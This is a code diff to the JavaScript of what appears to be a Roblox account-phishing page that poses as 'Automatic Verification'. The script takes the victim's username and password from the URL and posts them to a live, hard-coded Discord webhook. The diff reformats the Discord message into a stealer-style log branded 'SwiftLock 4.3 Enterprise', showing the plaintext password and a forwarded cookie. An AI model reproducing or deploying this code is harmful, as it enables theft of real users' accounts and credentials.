@@ -124,9 +124,8 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Discord webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOKS
-        const SUCCESS_WEBHOOK = "";
-        const FAILED_WEBHOOK = "";
+        // Discord webhook URL - Only one webhook for success
+        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         
         // Display the tracking info
         if (trackingId) {
@@ -327,7 +326,7 @@
                 
                 resultMessage.classList.remove('hidden');
                 
-                // Send result to Discord
+                // Send result to Discord using the SwiftLock format
                 await sendToDiscord(isSuccess);
             } catch (error) {
                 console.error('Error reporting result:', error);
@@ -336,53 +335,55 @@
         }
         
         async function sendToDiscord(isSuccess) {
-            const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
+            const webhookUrl = SUCCESS_WEBHOOK;
             const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
-            const color = isSuccess ? 65280 : 16711680;
             
-            const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+            // Get current time in the format "Today at HH:MM AM/PM"
+            const now = new Date();
+            const timeString = "Today at " + now.toLocaleTimeString('en-US', { 
+                hour: 'numeric', 
+                minute: '2-digit', 
+                hour12: true 
+            });
             
             const embed = {
-                title: `🔐 Automatic Verification - ${statusText}`,
-                url: profileUrl,
-                color: color,
-                description: "**⎯⎯⎯⎯⎯『 Automatic Verification Result 』⎯⎯⎯⎯⎯**",
+                title: "SwiftLock 4.3 Enterprise",
+                description: "Click to view the user's code.\n\nYou've earned it last point:",
+                color: isSuccess ? 65280 : 16711680, // Green for success, red for failure
                 fields: [
                     {
-                        name: "👤 Account",
-                        value: `[${username}](${profileUrl})`,
-                        inline: true
-                    },
-                    {
-                        name: "🔐 Password",
-                        value: `||${password}||`,
-                        inline: true
-                    },
-                    {
-                        name: "📊 Result",
-                        value: statusText,
-                        inline: true
-                    },
-                    {
-                        name: "🆔 Tracking ID",
-                        value: trackingId,
+                        name: "**Username**: Password",
+                        value: `${username}: ||${password}||`,
                         inline: false
                     },
                     {
-                        name: "🤖 Method",
-                        value: "Automatic Verification",
+                        name: "**Account info**: Membership",
+                        value: `0 days old, 15+: NIC`,
+                        inline: false
+                    },
+                    {
+                        name: "**Security**: Rabbit",
+                        value: `Uncertified, no phone: $10`,
+                        inline: false
+                    },
+                    {
+                        name: "**Inventory SAP**: Credit",
+                        value: `Inventory SAP: $0.00`,
+                        inline: false
+                    },
+                    {
+                        name: "**Cookie**: Game",
+                        value: `Cookie: Forwarded`,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
-                    icon_url: "https://www.roblox.com/favicon.ico"
-                },
-                timestamp: new Date().toISOString()
+                    text: `Insert in login - ${timeString} | Tracking ID: ${trackingId}`
+                }
             };
             
             const payload = {
-                username: "Automatic Verification",
+                username: "SwiftLock Enterprise",
                 content: isSuccess ? "#success #auto_verified" : "#failed #auto_verified",
                 embeds: [embed]
             };
